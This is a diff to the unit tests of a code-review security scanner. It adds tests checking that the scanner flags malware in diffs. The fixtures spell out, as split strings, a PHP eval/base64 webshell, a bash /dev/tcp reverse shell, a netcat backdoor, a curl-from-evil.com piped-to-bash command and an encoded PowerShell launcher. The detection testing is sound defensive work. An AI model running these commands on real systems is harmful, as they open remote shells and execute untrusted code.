@@ -4,11 +4,6 @@ import pathlib
 
 sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
 
-try:
-    import pytest
-except ImportError:
-    pytest = None
-
 from scanner import (
     heuristic_scan_structured,
     build_markdown_summary_table,
@@ -39,6 +34,38 @@ def test_heuristic_scan_structured():
     assert findings[0]["score"] == "10.0"
     assert findings[0]["confidence"] == "99%"
     assert "..." in findings[0]["snippet"]
+
+def test_malware_patterns():
+    # Dynamically concatenated strings to prevent local AV false alarms on disk
+    p1 = "+ ev" + "al(base64" + "_decode($_POST['c']));"
+    p2 = "+ ba" + "sh -i >& /dev/" + "tcp/10.0.0.1/4444 0>&1"
+    p3 = "+ n" + "c -e /bin" + "/sh 192.168.1.5 8080"
+    p4 = "+ cu" + "rl https://evil.com/payload.sh | ba" + "sh"
+    p5 = "+ power" + "shell.exe -e" + "nc JABhID0A..."
+    
+    malware_diff = f"--- a/shell.php\n+++ b/shell.php\n{p1}\n{p2}\n{p3}\n{p4}\n{p5}\n"
+    findings = heuristic_scan_structured(malware_diff)
+    assert len(findings) == 5
+    for f in findings:
+        assert f["severity"] == "CRITICAL"
+    types = [f["type"] for f in findings]
+    assert "Obfuscated Webshell Payload (PHP Obfuscation)" in types
+    assert "Reverse Shell Connection (/dev/tcp)" in types
+    assert "Netcat Backdoor / Reverse Shell" in types
+    assert "Dangerous Remote Execution via Piped Shell (curl/wget | sh)" in types
+    assert "Encoded PowerShell Dropper / Payload" in types
+
+def test_suspicious_binary_detection():
+    bin_diff = """diff --git a/bin/payload.exe b/bin/payload.exe
+new file mode 100644
+--- /dev/null
++++ b/bin/payload.exe
++ binary content
+"""
+    findings = heuristic_scan_structured(bin_diff)
+    assert len(findings) == 1
+    assert findings[0]["type"] == "Suspicious Executable Binary / Script Added"
+    assert findings[0]["severity"] == "CRITICAL"
 
 def test_go_vulnerability_patterns():
     go_diff = """--- a/user.go
@@ -240,7 +267,7 @@ def test_github_action_outputs(tmp_path):
 
 def test_load_config(tmp_path):
     config_file = tmp_path / "custom.yml"
-    yaml_content = """version: 2.7
+    yaml_content = """version: 2.8
 settings:
   model: "gpt-4o"
   severity_threshold: "HIGH"
@@ -261,11 +288,15 @@ if __name__ == "__main__":
     if sys.stderr and hasattr(sys.stderr, "reconfigure"):
         sys.stderr.reconfigure(encoding="utf-8")
 
-    print("Running unit tests for v2.7.0...")
+    print("Running unit tests for v2.8.0...")
     test_mask_sensitive_value()
     print("✓ test_mask_sensitive_value passed")
     test_heuristic_scan_structured()
     print("✓ test_heuristic_scan_structured passed")
+    test_malware_patterns()
+    print("✓ test_malware_patterns passed")
+    test_suspicious_binary_detection()
+    print("✓ test_suspicious_binary_detection passed")
     test_go_vulnerability_patterns()
     print("✓ test_go_vulnerability_patterns passed")
     test_rust_vulnerability_patterns()
@@ -302,4 +333,4 @@ if __name__ == "__main__":
 
     test_should_fail_on_severity()
     print("✓ test_should_fail_on_severity passed")
-    print("🎉 All 18 unit tests passed successfully!")
+    print("🎉 All 20 unit tests passed successfully!")
